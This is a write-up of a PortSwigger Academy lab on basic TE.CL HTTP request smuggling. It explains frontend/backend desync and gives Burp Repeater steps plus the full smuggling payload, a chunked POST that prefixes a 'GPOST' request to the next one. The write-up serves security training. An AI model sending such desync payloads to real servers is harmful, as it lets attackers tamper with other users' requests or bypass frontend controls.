# Lab: HTTP request smuggling, basic TE.CL vulnerability

**Official lab:** [https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

## Lab idea

This foundational exercise introduces TE.CL request smuggling, the reverse of the CL.TE interpretation mismatch. It practices understanding how distinct frontend and backend framing rules can desynchronize successive requests.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
2. Using Burp Repeater, issue the following request twice:
3. You need to include the trailing sequence \r\n\r\n following the final 0 .
4. The second response should say: Unrecognized method GPOST .

## Payloads / key values
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`
- `\r\n\r\n`
- `0`
- `Unrecognized method GPOST`

## Official source
- [PortSwigger Academy: Lab: HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
